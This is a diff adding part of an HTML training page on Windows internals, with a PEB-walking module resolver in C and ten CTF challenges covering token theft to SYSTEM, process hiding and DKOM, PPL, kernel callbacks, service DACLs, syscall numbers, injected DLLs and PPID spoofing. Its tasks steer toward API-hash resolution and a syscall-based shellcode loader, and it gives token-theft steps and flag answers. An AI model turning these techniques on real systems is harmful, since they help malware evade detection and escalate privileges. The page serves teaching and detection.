+    PLIST_ENTRY head = &amp;peb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY curr = head->Flink;
+    while (curr != head) {
+        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
+            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+        // Convert wide name to ASCII for hashing
+        char name[256] = {0};
+        int len = entry->FullDllName.Length / sizeof(WCHAR);
+        // Extract just the filename
+        WCHAR *wName = entry->FullDllName.Buffer;
+        for (int i = len - 1; i >= 0; i--) {
+            if (wName[i] == L'\\') { wName += i + 1; len -= i + 1; break; }
+        }
+        for (int i = 0; i &lt; len &amp;&amp; i &lt; 255; i++)
+            name[i] = (char)(wName[i] | 0x20); // tolower
+
+        if (HashString(name) == hash)
+            return (HMODULE)entry->DllBase;
+        curr = curr->Flink;
+    }
+    return NULL;
+}
+
+int main() {
+    // Hash of "kernel32.dll"
+    DWORD k32hash = HashString("kernel32.dll");
+    printf("[*] Hash of 'kernel32.dll': 0x%08X\n", k32hash);
+
+    HMODULE k32 = GetModuleByHash(k32hash);
+    printf("[+] kernel32.dll base via PEB walk: %p\n", k32);
+    printf("[+] kernel32.dll base via GetModuleHandle: %p\n",
+        GetModuleHandleA("kernel32.dll"));
+    printf("[*] Match: %s\n", k32 == GetModuleHandleA("kernel32.dll") ? "YES" : "NO");
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run — verify PEB walk matches GetModuleHandle results.</li>
+              <li>Extend the code to also resolve function addresses by parsing the PE export table (replacing GetProcAddress).</li>
+              <li>Compute API hashes for common functions (VirtualAlloc, CreateThread, LoadLibrary) and use them for stealthy resolution.</li>
+              <li>Combine PEB resolution with direct syscalls from Lab 8 to create a fully API-independent shellcode loader.</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- CTF TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Find the Hidden Process</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A process is hiding from <code>Get-Process</code> / Task Manager by unlinking itself from the ActiveProcessLinks list. Find its PID and image name using alternative enumeration methods.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Setup: Run this script (elevated) to simulate a hidden process.
+# It starts a background process and gives you the scenario.
+$hidden = Start-Process -FilePath "cmd.exe" -ArgumentList "/c title HIDDEN_FLAG && pause" `
+    -WindowStyle Hidden -PassThru
+$flag = "FLAG{ActiveProcessLinks_" + $hidden.Id + "}"
+Set-Content -Path "C:\temp\ctf1_flag.txt" -Value $flag
+Write-Host "[*] A process has been 'hidden'. Find its PID."
+Write-Host "[*] Hint: the process has 'HIDDEN_FLAG' in its window title."
+
+# Your goal: find the hidden process PID using methods that DON'T
+# rely on NtQuerySystemInformation / ActiveProcessLinks:
+# - EnumWindows to find by window title
+# - Direct handle opening by brute-forcing PIDs
+# - WMI event subscriptions
+# - ETW tracing</code></pre>
+<pre><code class="language-powershell"># Method 1: Find by window title (bypasses process list unlinking)
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+public class WinAPI {
+    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc cb, IntPtr lParam);
+    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder sb, int max);
+    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
+}
+"@
+
+[WinAPI]::EnumWindows({
+    param($hWnd, $lParam)
+    $sb = New-Object System.Text.StringBuilder 256
+    [WinAPI]::GetWindowText($hWnd, $sb, 256) | Out-Null
+    $title = $sb.ToString()
+    if ($title -like "*HIDDEN*") {
+        $pid = 0
+        [WinAPI]::GetWindowThreadProcessId($hWnd, [ref]$pid) | Out-Null
+        Write-Host "[+] Found! Title: '$title' PID: $pid"
+    }
+    return $true
+}, [IntPtr]::Zero)
+
+# Method 2: Brute-force PID range with OpenProcess
+1..65535 | ForEach-Object {
+    # ... try OpenProcess for each PID
+    # PIDs not in Get-Process output but OpenProcess succeeds = hidden
+}</code></pre>
+            <p><strong>Validation:</strong> Once you find the PID, read <code>C:\temp\ctf1_flag.txt</code> and verify your PID matches the one in the flag.</p>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>A process unlinked from <code>ActiveProcessLinks</code> is invisible to APIs that walk that list (Task Manager, <code>Get-Process</code>, <code>NtQuerySystemInformation(SystemProcessInformation)</code>). But the process still has windows, threads, and handles. Use <code>EnumWindows</code> to find windows by title, or enumerate all possible PIDs (0–65535) with <code>OpenProcess</code> — subtract the ones visible in <code>Get-Process</code> to find the hidden one. In a real scenario, kernel-mode tools (see WinDbg reference) can walk KPROCESS thread lists directly.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Token Theft for Privilege Escalation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You have an elevated admin shell. Escalate to SYSTEM by stealing a token from a SYSTEM process and spawning a new shell with it.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// token_thief.c — Steal SYSTEM token and spawn cmd.exe as SYSTEM
+// Compile: cl.exe token_thief.c advapi32.lib /Fe:token_thief.exe
+// Must be run elevated (admin).
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+// TODO: Implement these functions to complete the challenge
+
+BOOL EnableDebugPrivilege() {
+    // Enable SeDebugPrivilege on current process token
+    // (Refer to Lab 2 for the implementation)
+    // YOUR CODE HERE
+    return FALSE;
+}
+
+DWORD FindSystemProcess() {
+    // Find PID of a process running as SYSTEM
+    // Good targets: winlogon.exe, lsass.exe, services.exe
+    // YOUR CODE HERE
+    return 0;
+}
+
+BOOL StealTokenAndSpawn(DWORD pid) {
+    // 1. OpenProcess with PROCESS_QUERY_LIMITED_INFORMATION
+    // 2. OpenProcessToken with TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
+    // 3. DuplicateTokenEx → TokenPrimary
+    // 4. CreateProcessWithTokenW to spawn cmd.exe
+    // YOUR CODE HERE
+    return FALSE;
+}
+
+int main() {
+    printf("=== Token Theft Challenge ===\n");
+    printf("[*] Step 1: Enable SeDebugPrivilege\n");
+    if (!EnableDebugPrivilege()) {
+        printf("[-] Failed. Are you running elevated?\n");
+        return 1;
+    }
+    printf("[+] Done.\n");
+
+    printf("[*] Step 2: Find SYSTEM process\n");
+    DWORD pid = FindSystemProcess();
+    if (!pid) {
+        printf("[-] No SYSTEM process found.\n");
+        return 1;
+    }
+    printf("[+] Target PID: %lu\n", pid);
+
+    printf("[*] Step 3: Steal token and spawn shell\n");
+    if (StealTokenAndSpawn(pid)) {
+        printf("[+] FLAG{token_theft_to_SYSTEM}\n");
+    } else {
+        printf("[-] Token theft failed: %lu\n", GetLastError());
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Goal:</strong> Fill in the three TODO functions. When <code>token_thief.exe</code> runs successfully, a new <code>cmd.exe</code> window opens running as <code>NT AUTHORITY\SYSTEM</code>. Verify with <code>whoami</code> in the new window.</p>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The full implementation is in the Notes tab under "Token Manipulation." The key steps are: (1) <code>OpenProcessToken</code> on a SYSTEM process — use <code>winlogon.exe</code> since it's always running as SYSTEM and is stable. (2) <code>DuplicateTokenEx</code> with <code>SecurityImpersonation</code> level and <code>TokenPrimary</code> type — you need a primary token for <code>CreateProcessWithTokenW</code>. (3) <code>CreateProcessWithTokenW</code> with <code>LOGON_WITH_PROFILE</code>. Common pitfalls: forgetting SeDebugPrivilege (needed to open the SYSTEM process token), using the wrong token type (Impersonation vs Primary), and insufficient access rights in <code>OpenProcessToken</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Parse Token Privileges</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A suspicious process is running with elevated privileges. Enumerate its token and identify which dangerous privileges are enabled. The flag is the count of enabled privileges with "Se" prefix that could allow privilege escalation.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Setup: a process has been spawned with specific privileges enabled
+# Find the process named "suspicious_svc.exe" and enumerate its token
+
+# Approach 1: Use NtObjectManager
+Import-Module NtObjectManager
+$proc = Get-NtProcess -Name "suspicious_svc.exe"
+$token = Get-NtToken -Process $proc
+$token.Privileges | Where-Object { $_.Enabled } | Format-Table Name, Enabled
+
+# Approach 2: Write C code using GetTokenInformation(TokenPrivileges)
+# Count how many privileges with "Se" prefix are enabled
+# FLAG{count_of_enabled_se_privileges}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>OpenProcessToken</code> + <code>GetTokenInformation(TokenPrivileges)</code>. Iterate through the <code>LUID_AND_ATTRIBUTES</code> array. Use <code>LookupPrivilegeNameA</code> to convert each LUID to a name. Count entries where <code>Attributes &amp; SE_PRIVILEGE_ENABLED</code> is set. Key escalation privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Identify Process Protection Level</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Multiple processes are running with different protection levels (PPL). Identify which process is running as Protected (WinTcb-Light) and report its PID. The flag format is <code>FLAG{PID_ProtectionLevel}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Enumerate process protection levels
+Import-Module NtObjectManager
+Get-NtProcess -Access QueryLimitedInformation | ForEach-Object {
+    [PSCustomObject]@{
+        PID        = $_.ProcessId
+        Name       = $_.Name
+        Protection = $_.Protection
+    }
+} | Where-Object { $_.Protection -ne "None" } | Format-Table -AutoSize
+
+# Which process has WinTcb-Light protection?
+# FLAG{PID_WinTcb-Light}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Protected Process Light (PPL) levels: WinTcb (highest), Windows, WinTcb-Light, Windows-Light, Antimalware-Light, Lsa-Light. Use <code>NtQueryInformationProcess(ProcessProtectionInformation)</code> to read the <code>PS_PROTECTION</code> structure. The <code>Type</code> field (PsProtectedTypeProtectedLight = 2) and <code>Signer</code> field (PsProtectedSignerWinTcb = 6) determine the protection level. csrss.exe and services.exe typically run as WinTcb-Light.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Enumerate Kernel Callbacks</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">An EDR has registered kernel callbacks. Using WinDbg or a kernel-mode tool, enumerate all PsSetCreateProcessNotifyRoutine callbacks and identify which driver registered each one. The flag is the name of the non-Microsoft driver that registered a callback.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Scenario: Kernel debugging session available
+# In WinDbg:
+#   !callback                           — list all callbacks
+#   !drvobj \Driver\SuspectDriver 2     — show driver dispatch table
+#
+# Or use PCHunter / System Informer to view kernel callbacks from user mode
+
+# Enumerate loaded drivers and find the suspicious one
+Get-CimInstance Win32_SystemDriver | Where-Object {
+    $_.State -eq "Running" -and $_.PathName -notmatch "Windows"
+} | Select-Object Name, PathName | Format-Table -AutoSize</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Process notification callbacks are stored in the <code>PspCreateProcessNotifyRoutine</code> array (up to 64 entries). Each entry is an <code>EX_CALLBACK_ROUTINE_BLOCK</code> pointer (masked — clear the low 4 bits). Use <code>!callback</code> in WinDbg or manually: <code>dq nt!PspCreateProcessNotifyRoutine L40</code>. For each non-zero entry, unmask and resolve the function address to a driver with <code>ln &lt;addr&gt;</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Detect DKOM (Direct Kernel Object Manipulation)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A rootkit has hidden a process by unlinking it from the EPROCESS ActiveProcessLinks doubly-linked list. Find the hidden process using alternative kernel enumeration methods.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Detection approaches:
+# 1. Compare process lists from different sources
+$tasklistProcs = tasklist /fo csv | ConvertFrom-Csv | Select-Object -ExpandProperty "Image Name"
+$wmiProcs = (Get-CimInstance Win32_Process).Name
+$psProcs = (Get-Process).Name
+
+# 2. Enumerate via thread list (threads aren't unlinked by simple DKOM)
+# Each ETHREAD has a pointer to its owning EPROCESS
+# Walk KiProcessListHead or PsActiveProcessHead alternatives
+
+# 3. Use handle table enumeration
+# The PspCidTable (Client ID table) contains all PIDs
+# Even DKOM-hidden processes remain in this table
+
+# 4. Cross-reference with ETW or kernel pool scanning</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>DKOM hides processes from APIs that walk <code>ActiveProcessLinks</code> (NtQuerySystemInformation → SystemProcessInformation). But alternative structures still reference the process: (1) <code>PspCidTable</code> — the handle table for PIDs/TIDs, (2) <code>HandleTableListHead</code> — all handle tables are linked here, (3) Thread scheduling lists — KTHREAD structures in scheduler queues. In WinDbg: <code>!process 0 0</code> walks ActiveProcessLinks, but <code>!for_each_thread</code> walks thread lists. Compare both to find discrepancies. Pool tag scanning (<code>!poolfind Proc</code>) also works.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Analyze Security Descriptors</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A service has been misconfigured with an overly permissive security descriptor. Find the service with a DACL that grants Everyone (WD) full control. The flag is the service name.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Enumerate service security descriptors
+Get-Service | ForEach-Object {
+    $sddl = (sc.exe sdshow $_.Name 2>$null) | Where-Object { $_ -match "^D:" }
+    if ($sddl -match "WD.*GA|WD.*RPWP") {
+        [PSCustomObject]@{
+            Name = $_.Name
+            SDDL = $sddl
+        }
+    }
+} | Format-Table -AutoSize
+
+# FLAG{service_name_with_everyone_full_control}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>sc sdshow &lt;servicename&gt;</code> to dump the SDDL string for each service. Parse for ACEs granting rights to <code>WD</code> (Everyone) or <code>BU</code> (BUILTIN\Users). A dangerous DACL looks like <code>D:(A;;GA;;;WD)</code> — Allow, Generic All, Everyone. Also check for <code>RPWPCCDCLCSWRCWDWOGA</code> (all service rights). The service with this misconfiguration is exploitable for privilege escalation via binary replacement.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Syscall Number Identification</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You're reverse-engineering malware that uses direct syscalls. Given a series of syscall numbers observed in the binary, identify which NT functions they correspond to on the target OS build. The flag is the function name for SSN 0x0055.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// The malware contains these syscall invocations:
+//   mov eax, 0x0018  → syscall
+//   mov eax, 0x0036  → syscall
+//   mov eax, 0x0055  → syscall
+//   mov eax, 0x00C1  → syscall
+//
+// Target: Windows 10 21H2 (Build 19044)
+// Resolve each SSN to its Nt* function name
+
+// Approach: dump SSNs from ntdll.dll on the target build
+// or use the j00ru syscall table: https://j00ru.vexillium.org/syscalls/nt/64/</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>SSNs vary per Windows build. For Build 19044 (21H2): 0x0018 = NtAllocateVirtualMemory, 0x0036 = NtWriteVirtualMemory, 0x0055 = NtCreateFile, 0x00C1 = NtCreateThreadEx. To verify: open ntdll.dll in a disassembler, find the target function, and read the <code>mov eax, SSN</code> value at offset +4 from the function start. <code>FLAG{NtCreateFile}</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Find the Injected DLL</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A legitimate process has been compromised — an attacker injected a malicious DLL. Find the injected DLL by identifying unsigned modules or modules loaded from suspicious paths. The flag is the DLL filename.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Approach 1: Check for unsigned DLLs in a process
+$proc = Get-Process -Name "target_process"
+$proc.Modules | ForEach-Object {
+    $sig = Get-AuthenticodeSignature $_.FileName -ErrorAction SilentlyContinue
+    [PSCustomObject]@{
+        Module  = $_.ModuleName
+        Path    = $_.FileName
+        Signed  = $sig.Status
+    }
+} | Where-Object { $_.Signed -ne "Valid" } | Format-Table -AutoSize
+
+# Approach 2: Look for DLLs loaded from temp/user directories
+$proc.Modules | Where-Object {
+    $_.FileName -match "\\Temp\\|\\AppData\\|\\Downloads\\"
+} | Format-Table ModuleName, FileName</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Injected DLLs often have these indicators: (1) Unsigned — no valid Authenticode signature, (2) Loaded from unusual paths (<code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public</code>), (3) Not in the process's import table (loaded dynamically), (4) Suspicious names or random characters. In Process Explorer: enable "Verify Image Signatures" under Options. Yellow-highlighted DLLs are unsigned. Also check with <code>listdlls.exe -u &lt;process&gt;</code> from Sysinternals to show unsigned DLLs.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Parent PID Spoofing Detection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">An attacker used PPID spoofing to make a malicious process appear as a child of explorer.exe. Detect the spoofed process by correlating actual parent with claimed parent. The flag is the real parent PID.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># PPID Spoofing: process claims explorer.exe as parent, but was
+# actually spawned by cmd.exe. Detect the discrepancy.
+
+# Method 1: Compare CreationTime — child should be created AFTER parent
+Get-CimInstance Win32_Process | ForEach-Object {
+    $parent = Get-CimInstance Win32_Process -Filter "ProcessId = $($_.ParentProcessId)" -ErrorAction SilentlyContinue
+    if ($parent -and $_.CreationDate -lt $parent.CreationDate) {
+        Write-Host "[!] SPOOFED: $($_.Name) (PID: $($_.ProcessId)) claims parent $($parent.Name) (PID: $($_.ParentProcessId)) but parent was created AFTER child!"
+    }
+}
+
+# Method 2: ETW tracing — ProcessStart events contain the real creating process
+# The creating process (from ETW) may differ from the ParentProcessId field</code></pre>
+<pre><code class="language-c">// How PPID spoofing works (for understanding the attack):
+// STARTUPINFOEX si = {0};
+// si.lpAttributeList → PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+// The parent PID in EPROCESS is set to the spoofed value
+// But ETW events and creation timestamps reveal the truth</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>PPID spoofing uses <code>UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)</code> during <code>CreateProcess</code>. The <code>InheritedFromUniqueProcessId</code> field in EPROCESS is set to the spoofed PID. Detection: (1) Creation timestamp analysis — a child can't be older than its parent. (2) ETW <code>ProcessStart</code> events record the actual creating process PID in the event data, which differs from the PPID field. (3) Check if the claimed parent logically makes sense (e.g., powershell.exe with parent winlogon.exe is suspicious).</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
